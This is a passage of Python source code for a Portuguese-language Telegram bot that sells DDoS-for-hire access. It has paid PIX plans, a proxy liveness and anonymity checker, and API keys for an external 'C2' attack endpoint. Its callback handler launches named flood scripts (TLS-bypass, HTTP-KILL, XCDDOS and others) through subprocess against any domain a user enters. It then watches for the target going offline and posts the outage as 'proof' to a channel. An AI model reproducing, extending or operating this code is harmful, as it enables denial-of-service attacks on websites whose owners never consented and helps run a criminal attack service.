    msg = await update.message.reply_text("🔄 <i>Verificando proxies com AZENV... (isso pode levar alguns segundos)</i>", parse_mode=constants.ParseMode.HTML)

    alive_proxies = []
    country_counts = {}
    anon_counts = {"Elite": 0, "Anonymous": 0, "Transparent": 0, "Unknown (TCP/Socks)": 0}

    sem = asyncio.Semaphore(200)
    async with aiohttp.ClientSession() as session:
        async def check(p):
            try:
                ip = p.split(":")[0]; port = int(p.split(":")[1])
                proxy_url = f"http://{ip}:{port}"
                async with sem:
                    anon = "Unknown"
                    is_alive = False

                    try:
                        async with session.get("http://azenv.net/", proxy=proxy_url, timeout=3) as resp_azenv:
                            if resp_azenv.status == 200:
                                is_alive = True
                                text = await resp_azenv.text()
                                if "HTTP_X_FORWARDED_FOR" in text or "HTTP_CLIENT_IP" in text:
                                    anon = "Transparent"
                                elif "HTTP_VIA" in text or "HTTP_X_PROXY_ID" in text:
                                    anon = "Anonymous"
                                else:
                                    anon = "Elite"
                    except:
                        try:
                            r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), timeout=2)
                            w.close(); await w.wait_closed()
                            is_alive = True
                            anon = "Unknown (TCP/Socks)"
                        except: pass

                    if is_alive:
                        try:
                            async with session.get(f"http://ip-api.com/json/{ip}?fields=country", timeout=2) as resp_geo:
                                c = (await resp_geo.json()).get("country", "Unknown") if resp_geo.status == 200 else "Unknown"
                        except: c = "Unknown"
                        return p, c, anon

            except: pass
            return None, None, None

        tasks = [check(p) for p in proxies]
        results = await asyncio.gather(*tasks)

    for p, c, anon in results:
        if p:
            alive_proxies.append(p)
            country_counts[c] = country_counts.get(c, 0) + 1
            anon_counts[anon] = anon_counts.get(anon, 0) + 1

    alive_count = len(alive_proxies)
    rate = (alive_count / total) * 100 if total > 0 else 0

    sorted_countries = sorted(country_counts.items(), key=lambda x: x[1], reverse=True)
    top_countries = sorted_countries[:15]
    others_count = len(sorted_countries[15:])

    country_text = "\n".join([f"│ {c[0]}: {c[1]}" for c in top_countries])
    if others_count > 0:
        country_text += f"\n│ ... e outros {others_count} países"

    anon_text = "\n".join([f"│ {k}: {v}" for k, v in anon_counts.items() if v > 0])

    return {
        'alive_proxies': alive_proxies,
        'alive_count': alive_count,
        'total': total,
        'rate': rate,
        'country_text': country_text,
        'anon_text': anon_text,
        'country_counts': country_counts,
        'anon_counts': anon_counts,
        'use_server_file': use_server_file,
        'is_check2': is_check2
    }

async def process_multiple_proxy_files(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Processa múltiplos arquivos .txt (da mensagem, respondidos ou recentes) e retorna um único arquivo com todos os vivos."""
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    documents = []

    # 1. Coleta documentos da mensagem atual
    if update.message.document:
        documents.append(update.message.document)
    if hasattr(update.message, 'documents') and update.message.documents:
        documents.extend(update.message.documents)

    # 2. Coleta documentos da mensagem respondida (se houver)
    if update.message.reply_to_message:
        reply = update.message.reply_to_message
        if reply.document:
            documents.append(reply.document)
        if hasattr(reply, 'documents') and reply.documents:
            documents.extend(reply.documents)

    # 3. Se ainda não encontrou nenhum, escaneia as últimas 30 mensagens do chat (do mesmo usuário)
    if not documents:
        try:
            updates = await context.bot.get_updates(limit=30, timeout=1)
            for upd in updates:
                if upd.message and upd.message.chat_id == chat_id and upd.message.from_user.id == user_id:
                    if upd.message.document and upd.message.document.file_name.endswith('.txt'):
                        documents.append(upd.message.document)
        except Exception as e:
            print(f"Erro ao escanear histórico: {e}")

    # Filtra apenas .txt
    txt_docs = [doc for doc in documents if doc.file_name.endswith('.txt')]
    if not txt_docs:
        await update.message.reply_text("❌ <b>Nenhum arquivo .txt encontrado.</b>\nEnvie um ou mais arquivos .txt, responda a mensagens com eles ou encaminhe-os recentemente.", parse_mode=constants.ParseMode.HTML)
        return

    # Processa cada arquivo
    all_alive = []
    combined_stats = {
        'total': 0,
        'alive': 0,
        'countries': {},
        'anon': {"Elite": 0, "Anonymous": 0, "Transparent": 0, "Unknown (TCP/Socks)": 0}
    }

    for doc in txt_docs:
        file = await context.bot.get_file(doc.file_id)
        content = await file.download_as_bytearray()
        proxies = [line.decode('utf-8').strip() for line in content.splitlines() if line.strip()]
        if not proxies:
            continue
        combined_stats['total'] += len(proxies)
        # Verifica este lote
        result = await _check_proxies(proxies, False, update, context, is_check2=False)
        if result:
            all_alive.extend(result['alive_proxies'])
            combined_stats['alive'] += result['alive_count']
            # Agrega países
            for country, count in result['country_counts'].items():
                combined_stats['countries'][country] = combined_stats['countries'].get(country, 0) + count
            # Agrega anonimato
            for anon, count in result['anon_counts'].items():
                combined_stats['anon'][anon] = combined_stats['anon'].get(anon, 0) + count

    if not all_alive:
        await update.message.reply_text("❌ <b>Nenhuma proxy viva encontrada nos arquivos enviados.</b>", parse_mode=constants.ParseMode.HTML)
        return

    # Monta estatísticas finais
    total_proxies = combined_stats['total']
    total_alive = len(all_alive)
    rate = (total_alive / total_proxies * 100) if total_proxies > 0 else 0

    sorted_countries = sorted(combined_stats['countries'].items(), key=lambda x: x[1], reverse=True)
    top_countries = sorted_countries[:15]
    others_count = len(sorted_countries[15:])
    country_text = "\n".join([f"│ {c[0]}: {c[1]}" for c in top_countries])
    if others_count > 0:
        country_text += f"\n│ ... e outros {others_count} países"

    anon_text = "\n".join([f"│ {k}: {v}" for k, v in combined_stats['anon'].items() if v > 0])

    res_text = format_message("PROXY CHECKER MULTI - RESULTADO", [
        f"Total de proxies: <code>{total_proxies}</code>",
        f"Proxies ativas: <code>{total_alive}</code>",
        f"Taxa de sobrevivência: <code>{rate:.2f}%</code>",
        "┠ ──────────────────────────────────────",
        "🕵️ <b>Níveis de anonimato:</b>",
        anon_text,
        "┠ ──────────────────────────────────────",
        "🌍 <b>Distribuição por país:</b>",
        country_text
    ])

    # Cria arquivo único com todas as proxies vivas
    out_file = BytesIO("\n".join(all_alive).encode('utf-8'))
    out_file.name = f"combined_alive_{datetime.now(SP_TZ).strftime('%Y%m%d_%H%M%S')}.txt"
    await context.bot.send_document(
        chat_id=update.effective_chat.id,
        document=out_file,
        caption=res_text,
        parse_mode=constants.ParseMode.HTML
    )

# ================= COMANDOS DE PROXY =================
async def check_proxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not await check_access(update, context): return
    if update.message.reply_to_message and update.message.reply_to_message.document:
        result = await process_proxy_file(update, context, update.message.reply_to_message.document)
        if result:
            alive_proxies = result['alive_proxies']
            alive_count = result['alive_count']
            total = result['total']
            rate = result['rate']
            country_text = result['country_text']
            anon_text = result['anon_text']
            use_server_file = result['use_server_file']
            is_check2 = result['is_check2']

            res_text = format_message("PROXY CHECKER RESULT", [
                f"Alive count: <code>{alive_count}/{total}</code>",
                f"Survival rate: <code>{rate:.2f}%</code>",
                "┠ ──────────────────────────────────────",
                "🕵️ <b>Anonymity levels:</b>",
                anon_text,
                "┠ ──────────────────────────────────────",
                "🌍 <b>Country distribution:</b>",
                country_text
            ])

            kb = []
            if use_server_file and alive_count > 0 and is_check2:
                kb.append([InlineKeyboardButton("🔁 COLOCAR APENAS ATIVOS NO NÚCLEO", callback_data="replace_proxy")])
                chat_id = update.effective_chat.id
                last_check_result[chat_id] = alive_proxies

            if alive_count > 0:
                out_file = BytesIO("\n".join(alive_proxies).encode('utf-8'))
                out_file.name = f"checked_proxy_{datetime.now(SP_TZ).strftime('%H%M%S')}.txt"
                await update.message.reply_document(document=out_file, caption=res_text, reply_markup=InlineKeyboardMarkup(kb) if kb else None, parse_mode=constants.ParseMode.HTML)
            else:
                await update.message.reply_text(f"{res_text}\n❌ <b>Nenhuma proxy viva encontrada.</b>", parse_mode=constants.ParseMode.HTML)
    else:
        await update.message.reply_text("💡 <b>Uso:</b> Envie o seu arquivo <code>.txt</code> de proxies com a legenda <code>/check</code>, ou responda a um arquivo já enviado com <code>/check</code>.", parse_mode=constants.ParseMode.HTML)

async def check2_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """/check2: verifica as proxies do arquivo proxy.txt do servidor (ou um enviado)."""
    if not await check_access(update, context): return
    if update.message.reply_to_message and update.message.reply_to_message.document:
        result = await process_proxy_file(update, context, update.message.reply_to_message.document, is_check2=True)
        if result:
            alive_proxies = result['alive_proxies']
            alive_count = result['alive_count']
            total = result['total']
            rate = result['rate']
            country_text = result['country_text']
            anon_text = result['anon_text']
            use_server_file = result['use_server_file']
            is_check2 = result['is_check2']

            res_text = format_message("PROXY CHECKER RESULT", [
                f"Alive count: <code>{alive_count}/{total}</code>",
                f"Survival rate: <code>{rate:.2f}%</code>",
                "┠ ──────────────────────────────────────",
                "🕵️ <b>Anonymity levels:</b>",
                anon_text,
                "┠ ──────────────────────────────────────",
                "🌍 <b>Country distribution:</b>",
                country_text
            ])

            kb = []
            if use_server_file and alive_count > 0 and is_check2:
                kb.append([InlineKeyboardButton("🔁 COLOCAR APENAS ATIVOS NO NÚCLEO", callback_data="replace_proxy")])
                chat_id = update.effective_chat.id
                last_check_result[chat_id] = alive_proxies

            if alive_count > 0:
                out_file = BytesIO("\n".join(alive_proxies).encode('utf-8'))
                out_file.name = f"checked_proxy_{datetime.now(SP_TZ).strftime('%H%M%S')}.txt"
                await update.message.reply_document(document=out_file, caption=res_text, reply_markup=InlineKeyboardMarkup(kb) if kb else None, parse_mode=constants.ParseMode.HTML)
            else:
                await update.message.reply_text(f"{res_text}\n❌ <b>Nenhuma proxy viva encontrada.</b>", parse_mode=constants.ParseMode.HTML)
    else:
        result = await process_proxy_file(update, context, document=None, is_check2=True)
        if result:
            alive_proxies = result['alive_proxies']
            alive_count = result['alive_count']
            total = result['total']
            rate = result['rate']
            country_text = result['country_text']
            anon_text = result['anon_text']
            use_server_file = result['use_server_file']
            is_check2 = result['is_check2']

            res_text = format_message("PROXY CHECKER RESULT", [
                f"Alive count: <code>{alive_count}/{total}</code>",
                f"Survival rate: <code>{rate:.2f}%</code>",
                "┠ ──────────────────────────────────────",
                "🕵️ <b>Anonymity levels:</b>",
                anon_text,
                "┠ ──────────────────────────────────────",
                "🌍 <b>Country distribution:</b>",
                country_text
            ])

            kb = []
            if use_server_file and alive_count > 0 and is_check2:
                kb.append([InlineKeyboardButton("🔁 COLOCAR APENAS ATIVOS NO NÚCLEO", callback_data="replace_proxy")])
                chat_id = update.effective_chat.id
                last_check_result[chat_id] = alive_proxies

            if alive_count > 0:
                out_file = BytesIO("\n".join(alive_proxies).encode('utf-8'))
                out_file.name = f"checked_proxy_{datetime.now(SP_TZ).strftime('%H%M%S')}.txt"
                await update.message.reply_document(document=out_file, caption=res_text, reply_markup=InlineKeyboardMarkup(kb) if kb else None, parse_mode=constants.ParseMode.HTML)
            else:
                await update.message.reply_text(f"{res_text}\n❌ <b>Nenhuma proxy viva encontrada.</b>", parse_mode=constants.ParseMode.HTML)

async def checkmulti_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Processa múltiplos arquivos .txt e retorna um único arquivo com todas as proxies ativas."""
    if not await check_access(update, context): return
    await process_multiple_proxy_files(update, context)

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.caption:
        caption = update.message.caption
        if caption.startswith('/check'):
            if not await check_access(update, context): return
            if caption.startswith('/checkmulti'):
                await process_multiple_proxy_files(update, context)
            else:
                await process_proxy_file(update, context, update.message.document)
        elif caption.startswith('/check2'):
            if not await check_access(update, context): return
            await process_proxy_file(update, context, update.message.document, is_check2=True)

async def handle_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    user = query.from_user
    uid = user.id
    data = query.data
    chat_id = query.message.chat_id

    # ========== MENU CALLBACKS ==========
    if data.startswith("menu_"):
        await query.answer()
        if data == "menu_attack":
            await query.message.reply_text(
                "💡 Para iniciar um ataque, use o comando:\n"
                "<code>/attack dominio.com [tempo]</code>\n"
                "Exemplo: <code>/attack google.com 60</code>",
                parse_mode=constants.ParseMode.HTML
            )
        elif data == "menu_comprar":
            kb = [
                [InlineKeyboardButton(f"⚡ ACESSO 24H - R$ {PLANOS['diario']['valor']:.2f}", callback_data="buy_diario")],
                [InlineKeyboardButton(f"🛰️ SEMANAL - R$ {PLANOS['semanal']['valor']:.2f}", callback_data="buy_semanal")],
                [InlineKeyboardButton(f"💎 MENSAL - R$ {PLANOS['mensal']['valor']:.2f}", callback_data="buy_mensal")],
                [InlineKeyboardButton(f"🔥 TRIMESTRAL - R$ {PLANOS['trimestral']['valor']:.2f}", callback_data="buy_trimestral")],
            ]
            txt = format_message("MERCADO NEGRO TW-MDZ (VIP)", [
                "⚠️ <b>ATENÇÃO, AGENTE:</b>",
                "Para liberar o plano <b>TRIAL (3 dias)</b>,",
                "adquirir o pacote <b>👑 VITALÍCIO</b>,",
                "ou resolver falhas no sistema de PIX automático,",
                "<b>CONTATE O SUPORTE DIRETAMENTE:</b>",
                f"💬 <b>{SUPORTE_USER}</b>"
            ])
            await query.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)
        elif data == "menu_api":
            if not has_api_access(uid):
                await query.message.reply_text("❌ <b>ACESSO NEGADO AO TERMINAL C2</b>\nRestrito a Mensal+.", parse_mode=constants.ParseMode.HTML)
                return
            conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
            cur.execute("SELECT api_key, auth_ip FROM api_keys WHERE user_id = ?", (uid,))
            res = cur.fetchone(); conn.close()
            api_key = res[0] if res else "Nenhuma chave."
            auth_ip = res[1] if res else "Nenhum IP."
            kb = [[InlineKeyboardButton("🔑 Gerar/Regerar API Key", callback_data="gen_api")]]
            txt = format_message("TERMINAL API C2 (EXTERNO)", [
                f"🔐 <b>SUA API KEY ATUAL:</b>",
                f"<code>{api_key}</code>",
                f"🌐 <b>IP AUTORIZADO (WHITELIST):</b>",
                f"<code>{auth_ip}</code>"
            ])
            await query.message.reply_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)
        elif data == "menu_status":
            await query.message.reply_text("📊 <b>STATUS DO AGENTE</b>\nUse <code>/me</code> para ver seus dados e <code>/status</code> para estatísticas do servidor.", parse_mode=constants.ParseMode.HTML)
        elif data == "menu_gift":
            await query.message.reply_text("💡 <b>Modo de Uso do Gift:</b>\n<code>/resgatar MDZ-CODIGO-AQUI</code>\n\nOu clique no botão abaixo para resgatar um código.", parse_mode=constants.ParseMode.HTML)
        elif data == "menu_feed":
            await query.message.reply_text("📢 <b>Feedback</b>\nEnvie sua mensagem com o comando:\n<code>/feed sua mensagem</code>", parse_mode=constants.ParseMode.HTML)
        return

    # ========== CALLBACK DE SUBSTITUIÇÃO DE PROXY ==========
    if data == "replace_proxy":
        await query.answer()
        if chat_id not in last_check_result:
            await query.message.reply_text("❌ Nenhum resultado de verificação recente encontrado.", parse_mode=constants.ParseMode.HTML)
            return
        alive_proxies = last_check_result[chat_id]
        if not alive_proxies:
            await query.message.reply_text("❌ Nenhuma proxy ativa para substituir.", parse_mode=constants.ParseMode.HTML)
            return
        try:
            with open("proxy.txt", "w") as f:
                f.write("\n".join(alive_proxies))
            await query.message.reply_text(f"✅ <b>PROXY.TXT ATUALIZADO COM SUCESSO!</b>\nForam mantidas <code>{len(alive_proxies)}</code> proxies ativas.", parse_mode=constants.ParseMode.HTML)
            del last_check_result[chat_id]
        except Exception as e:
            await query.message.reply_text(f"❌ Erro ao substituir: {e}", parse_mode=constants.ParseMode.HTML)
        return

    # ========== OUTROS CALLBACKS ==========
    if data == "gen_api":
        if not has_api_access(uid): return await query.answer("❌ Acesso Exclusivo à Elite (Mensal+).", show_alert=True)
        new_key = str(uuid.uuid4())
        conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
        cur.execute("SELECT auth_ip FROM api_keys WHERE user_id = ?", (uid,))
        res = cur.fetchone()
        current_ip = res[0] if res else "Nenhum"
        cur.execute("INSERT OR REPLACE INTO api_keys (user_id, api_key, auth_ip) VALUES (?, ?, ?)", (uid, new_key, current_ip))
        conn.commit(); conn.close()
        kb = [[InlineKeyboardButton("🔑 Gerar Nova Key", callback_data="gen_api")]]
        txt = format_message("TERMINAL API C2 (EXTERNO)", [
            "✅ <b>NOVA CHAVE GERADA COM SUCESSO!</b>",
            f"🔐 <b>SUA API KEY ATUAL:</b> <code>{new_key}</code>",
            f"🌐 <b>IP AUTORIZADO (WHITELIST):</b> <code>{current_ip}</code>",
            "┠ ────────────────────────────────────────",
            "📚 <b>URL DE DISPARO (GET):</b>",
            f"<code>https://c2.mdzapis.com/api/attack?key={new_key}&target=ALVO&time=60&method=tls&threads=2</code>"
        ])
        return await query.edit_message_text(txt, reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)

    if data.startswith("cap_"):
        _, clicado, correto = data.split("_")
        if clicado == correto:
            captcha_passed.add(uid)
            await query.message.delete()
            await context.bot.send_message(chat_id=uid, text="✅ <b>VERIFICAÇÃO CONCLUÍDA.</b>\nDigite <code>/start</code> novamente.", parse_mode=constants.ParseMode.HTML)
        return

    if uid != OWNER_ID:
        if uid in banned_users and not data.startswith("appeal_"): return await query.answer(f"⛔ Rota cortada. Sem acesso.", show_alert=True)

    await query.answer()

    if data.startswith("appeal_"):
        target_uid = int(data.split("_")[1])
        reason = banned_users.get(target_uid, {}).get("reason", "Sem motivo especificado")
        kb = [[InlineKeyboardButton("🔓 ANISTIAR USUÁRIO", callback_data=f"unban_{target_uid}")]]
        await context.bot.send_message(OWNER_ID, text=f"🆘 <b>PEDIDO DE PERDÃO / APELAÇÃO</b>\n👤 Usuário: {user.first_name} (<code>{target_uid}</code>)\n📝 Motivo do Ban: <code>{reason}</code>\n<i>O infrator implora por acesso. Liberar?</i>", reply_markup=InlineKeyboardMarkup(kb), parse_mode=constants.ParseMode.HTML)
        await query.edit_message_text("✅ <b>Apelação enviada ao Supremo.</b>", parse_mode=constants.ParseMode.HTML)
        return

    if data.startswith("unban_"):
        if uid != OWNER_ID: return
        target_uid = int(data.split("_")[1])
        if target_uid in banned_users: del banned_users[target_uid]
        await query.edit_message_text(f"✅ <b>Julgamento:</b> Anistia aplicada para <code>{target_uid}</code>.", parse_mode=constants.ParseMode.HTML)
        try: await context.bot.send_message(target_uid, "🔓 <b>O SUPREMO CONCEDEU ANISTIA.</b>\nSeu acesso foi restaurado.", parse_mode=constants.ParseMode.HTML)
        except: pass
        return

    if data.startswith("buy_"):
        if get_config("pix_system") == "off":
            await query.answer("❌ Compras desativadas.", show_alert=True)
            return

        plano_key = data.split("_")[1]
        if plano_key == "vitalicio":
            return await query.edit_message_text(f"👑 Para comprar o pacote VITALÍCIO, por favor, chame {SUPORTE_USER}.", parse_mode=constants.ParseMode.HTML)

        plano = PLANOS[plano_key]
        valor_base = plano['valor']
        await query.edit_message_text("🔄 <i>Criptografando payload financeiro...</i>", parse_mode=constants.ParseMode.HTML)

        await send_log(context, "PAY_GEN", uid, f"Gerou payload PIX. Plano: {plano_key.upper()}")

        try:
            url = f"{API_GERAR}{OWNER_ID}&valor={valor_base}"
            resp = requests.get(url, timeout=10)
            if resp.status_code != 200:
                raise Exception(f"API retornou status {resp.status_code}")
            res = resp.json()
            pix_code = res.get("pixCopiaECola", "N/A")
            qrcode_base64 = res.get("qrcode_base64", "")
            trans_id = res.get("external_id")
            taxa = res.get("taxa", 0.0)
            amount = res.get("amount", valor_base)

            if not trans_id:
                raise Exception("ID de transação não retornado pela API.")

            conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
            cur.execute("INSERT OR REPLACE INTO pending_payments VALUES (?, ?, ?)", (trans_id, uid, plano['dias']))
            conn.commit(); conn.close()

            txt = format_message("SISTEMA FINANCEIRO TW-MDZ", [
                f"📦 <b>Pacote:</b> <code>{plano['nome']}</code>",
                f"💰 <b>Valor base:</b> <code>R$ {valor_base:.2f}</code>",
                f"💸 <b>Taxa de processamento:</b> <code>R$ {taxa:.2f}</code>",
                f"💵 <b>Total a pagar:</b> <code>R$ {amount:.2f}</code>",
                f"⏳ <b>Status:</b> 🟡 <i>Aguardando PIX...</i>",
                "┠ ──────────────────────────────────────",
                "📋 <b>Código PIX (copia e cola):</b>",
                f"<code>{pix_code}</code>"
            ])

            if qrcode_base64:
                try:
                    if qrcode_base64.startswith("data:image"):
                        qrcode_base64 = qrcode_base64.split(",")[1]
                    img = BytesIO(base64.b64decode(qrcode_base64))
                    await query.message.delete()
                    msg_foto = await context.bot.send_photo(
                        chat_id=uid,
                        photo=img,
                        caption=txt,
                        parse_mode=constants.ParseMode.HTML
                    )
                except Exception:
                    await query.message.delete()
                    msg_foto = await context.bot.send_message(
                        chat_id=uid,
                        text=txt,
                        parse_mode=constants.ParseMode.HTML
                    )
            else:
                await query.message.delete()
                msg_foto = await context.bot.send_message(
                    chat_id=uid,
                    text=txt,
                    parse_mode=constants.ParseMode.HTML
                )

            asyncio.create_task(verificar_pagamento_loop(context, uid, trans_id, plano['dias'], plano_key, msg_foto.message_id))
        except requests.exceptions.RequestException as e:
            await query.edit_message_text(f"❌ Erro de rede: {e}", parse_mode=constants.ParseMode.HTML)
        except ValueError as e:
            await query.edit_message_text("❌ Erro: resposta inválida da API. Contate o Supremo.", parse_mode=constants.ParseMode.HTML)
        except Exception as e:
            await query.edit_message_text(f"❌ Erro crítico: {e}", parse_mode=constants.ParseMode.HTML)
        return

    if data.startswith("stop_"):
        if uid in active_attacks:
            try: active_attacks[uid].terminate()
            except: pass
            del active_attacks[uid]
            await query.edit_message_text("❖ ── ✦ ── <b>SIGKILL: PROCESSO ABORTADO</b> ── ✦ ── ❖", parse_mode=constants.ParseMode.HTML)
        return

    target = context.user_data.get('target')
    atk_time = context.user_data.get('time', DEFAULT_TIME)
    atk_threads = context.user_data.get('threads', DEFAULT_THREADS)
    is_group = context.user_data.get('is_group', False)

    cmd, d_method = [], ""
    if data == "mdzar": cmd, d_method = ["node", "ar.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"], "MDZ-AR"
    elif data == "mdzby": cmd, d_method = ["node", "bs", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"], "MDZ-BYPASS"
    elif data == "tls": cmd, d_method = ["node", "tls-bypass.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads)], "TLS-BYPASS"
    elif data == "tun": cmd, d_method = ["node", "tun.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"], "THUNDER"
    elif data == "rapid": cmd, d_method = ["node", "rapidv2", "bypass", str(atk_time), str(atk_threads), "proxy.txt", str(DEFAULT_RATE), target], "RAPID V2"
    elif data == "lez": cmd, d_method = ["node", "lezkill.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"], "LEZKILL"
    elif data == "tw-mdz": cmd, d_method = ["node", "tw.js", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"], "TW-MDZ"
    elif data == "mdzdd": cmd, d_method = ["./XCDDOS", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads)], "MDZ-DDOS"
    elif data == "h2": cmd, d_method = ["node", "h2", "GET", target, str(atk_time), str(atk_threads), "proxy.txt"], "H2"
    elif data == "hby": cmd, d_method = ["node", "hby", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt", "--all"], "HBY-FLOOD"
    elif data == "fury": cmd, d_method = ["node", "fu.js", "GET", target, str(atk_time), str(atk_threads), str(DEFAULT_RATE), "proxy.txt", "--full"], "HTTP-FURY"
    elif data == "httpkill": cmd, d_method = ["node", "httpk.js", target, str(atk_time), str(atk_threads), str(DEFAULT_RATE), "proxy.txt"], "HTTP-KILL"
    elif data == "mdzdestroy": cmd, d_method = ["node", "mdz-destroy", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"], "MDZ-DESTROY"
    elif data == "mdzfuck": cmd, d_method = ["node", "mdz-fuck", target, str(atk_time), str(DEFAULT_RATE), str(atk_threads), "proxy.txt"], "MDZ-FUCK"

    if cmd:
        try:
            proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            active_attacks[uid] = proc
            last_attack_time[uid] = time.time()

            conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
            cur.execute("INSERT INTO ataques VALUES (?, ?, ?, ?)", (uid, user.username, target, int(time.time())))
            conn.commit(); conn.close()

            await query.edit_message_text(f"❖ ── ✦ ── <b>ARMANDO OGIVA <code>{d_method}</code>...</b> ── ✦ ── ❖", parse_mode=constants.ParseMode.HTML)
            await send_log(context, "ATK", uid, f"Alvo: {target} | Método: {d_method} | Tempo: {atk_time}s | Threads: {atk_threads}")
            asyncio.create_task(monitor_ui(context, query.message.chat_id, query.message.message_id, target, d_method, uid, atk_time, is_group, atk_threads))
        except Exception as e:
            await query.edit_message_text(f"❌ <b>FATAL ERROR:</b> <code>{str(e)}</code>", parse_mode=constants.ParseMode.HTML)

async def monitor_ui(context, chat_id, msg_id, target, method, uid, atk_time, is_group, atk_threads):
    start_t = time.time()
    notificou_queda = False

    sleep_time = 5 if atk_time <= 120 else 15 if atk_time <= 600 else 30

    while (time.time() - start_t) < atk_time:
        if uid not in active_attacks or active_attacks[uid].poll() is not None: break

        rem = int(atk_time - (time.time() - start_t))
        if rem < 0: rem = 0
        perc = min(100, int(((atk_time-rem)/atk_time)*100))
        bar = f"{'█' * (perc // 10)}{'░' * (10 - (perc // 10))}"

        try:
            status_alvo = await check_site_status(target)

            if not notificou_queda and ("DOWN" in status_alvo or "DEAD" in status_alvo):
                tempo_queda = int(time.time() - start_t)
                frase = random.choice(FRASES_QUEDA)
                txt_prova = format_message("TW-MDZ C2 CONFIRMA QUEDA", [
                    f"🗣️ <i>\"{frase}\"</i>",
                    f"🎯 <b>Alvo Derrubado:</b> <code>{target}</code>",
                    f"⏱️ <b>Time to Drop:</b> <code>{tempo_queda}s</code>",
                    f"⏳ <b>Duração Total:</b> <code>{atk_time}s</code>",
                    f"⚙️ <b>Método C2:</b> <code>{method}</code>",
                    f"🧵 Threads: {atk_threads} | 💥 Rate: {DEFAULT_RATE}"
                ])
                try:
                    await context.bot.send_message(chat_id=ID_DO_CANAL_PROOF, text=txt_prova, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)
                    notificou_queda = True
                except: pass

            txt = format_message("MONITOR DE ANIQUILAÇÃO", [
                f"🎯 <b>Alvo:</b> <code>{target}</code>",
                f"📡 <b>Status:</b> {status_alvo}",
                f"🚀 <b>Método:</b> <code>{method}</code>",
                f"⏳ <b>Restam:</b> <code>{rem}s ativos</code>",
                "┠ ──────────────────────────────────────",
                f"📉 <b>Progresso:</b> [ {bar} ] <code>{perc}%</code>"
            ])
            await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=txt, reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 ABORTAR", callback_data=f"stop_{uid}")]]), parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

        except Exception: pass

        await asyncio.sleep(sleep_time)

    if uid in active_attacks:
        try: active_attacks[uid].terminate()
        except: pass
        del active_attacks[uid]

    status_final = await check_site_status(target)
    txt_feedback_final = format_message("OPERAÇÃO FINALIZADA", [
        f"🎯 <b>Alvo Atingido:</b> <code>{target}</code>",
        f"📡 <b>Status Pós-Ataque:</b> {status_final}",
        f"🧵 <b>Concorrência Aplicada:</b> <code>{atk_threads}</code>"
    ])
    try:
        await context.bot.edit_message_text(chat_id=chat_id, message_id=msg_id, text=txt_feedback_final, parse_mode=constants.ParseMode.HTML)
    except Exception:
        try: await context.bot.send_message(chat_id=chat_id, text=txt_feedback_final, parse_mode=constants.ParseMode.HTML, reply_to_message_id=msg_id)
        except: pass

# ==========================================
# 👑 COMANDOS ADMIN E FUNÇÕES AUXILIARES
# ==========================================
async def invite_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_access(update, context): return
    global bot_username_cache
    if not bot_username_cache: bot_username_cache = context.bot.username
    link = f"https://t.me/{bot_username_cache}?start={uid}"
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT invites, total_invites FROM referrals WHERE user_id = ?", (uid,))
    res = cur.fetchone(); conn.close()
    atual = res[0] if res else 0; total = res[1] if res else 0
    txt = format_message("PROGRAMA DE AFILIADOS", [
        f"🎯 <b>Meta:</b> {INVITES_FOR_VIP} indicações = {VIP_REWARD_DAYS} Dia VIP",
        f"📈 <b>Progresso Atual:</b> {atual}/{INVITES_FOR_VIP}",
        f"👥 <b>Recrutas Totais:</b> {total}",
        "┠ ──────────────────────────────────────",
        "🚀 <b>Seu Link de Recrutamento:</b>",
        f"<code>{link}</code>"
    ])
    await update.message.reply_text(txt, parse_mode=constants.ParseMode.HTML, disable_web_page_preview=True)

async def vipmenu(update: Update, context: ContextTypes.DEFAULT_TYPE):
    uid = update.effective_user.id
    if not await check_access(update, context): return
    if not has_api_access(uid):
        return await update.message.reply_text("❌ <b>ACESSO NEGADO AO TERMINAL C2</b>\nRestrito a Mensal+.", parse_mode=constants.ParseMode.HTML)
    conn = sqlite3.connect('nfu_master.db'); cur = conn.cursor()
    cur.execute("SELECT api_key, auth_ip FROM api_keys WHERE user_id = ?", (uid,))
    res = cur.fetchone(); conn.close()
    api_key = res[0] if res else "Nenhuma chave."
    auth_ip = res[1] if res else "Nenhum IP."
    kb = [[InlineKeyboardButton("🔑 Gerar/Regerar API Key", callback_data="gen_api")]]
    txt = format_message("TERMINAL API C2 (EXTERNO)", [
        f"🔐 <b>SUA API KEY ATUAL:</b>",
        f"<code>{api_key}</code>",
        f"🌐 <b>IP AUTORIZADO (WHITELIST):</b>",
        f"<code>{auth_ip}</code>"
    ])
    foto_id = get_config("menu_photo")
    if foto_id != "off":
